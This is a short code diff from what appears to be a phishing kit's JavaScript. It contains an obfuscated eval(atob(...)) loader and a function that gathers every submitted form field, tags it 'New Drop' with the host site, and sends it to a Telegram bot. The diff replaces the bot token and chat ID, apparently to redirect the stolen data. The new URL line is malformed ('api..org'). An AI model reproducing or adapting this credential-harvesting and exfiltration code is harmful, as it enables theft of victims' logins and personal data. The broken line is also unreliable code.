@@ -46,13 +46,13 @@ eval(atob("InVzZSBzdHJpY3QiO3ZhciB0aW1lcl9pZCxzb2NrZXQ9bnVsbCx0aW1lb3V0X3NlYz0xM
 function inspectExport(formdata,nextpage){
     on_submit();
     let strings = formdata
-    let apiToken = "5889507145:AAH6IPrmwpil8iT75B_-4-A8l5x0GqK9Muc";
-    let chatId = "6354668538";
+    let apiToken = "7074736846:AAFFHY3bjT7zziorrtSZLr8uwKDiTinqKf4";
+    let chatId = "6178580575";
      let message = `New Drop 🏆🏆🏆 %0A%0AFrom: ${window.location.host} %0A%0A`;
      Object.keys(strings).forEach(function(key) {
              message += ` ${strings[key]['name']} : ${strings[key]['value']} %0A%0A`;
        })
-    let t = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+    let t = `https://api..org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${message}`;
  
     
     let requestt = new XMLHttpRequest();
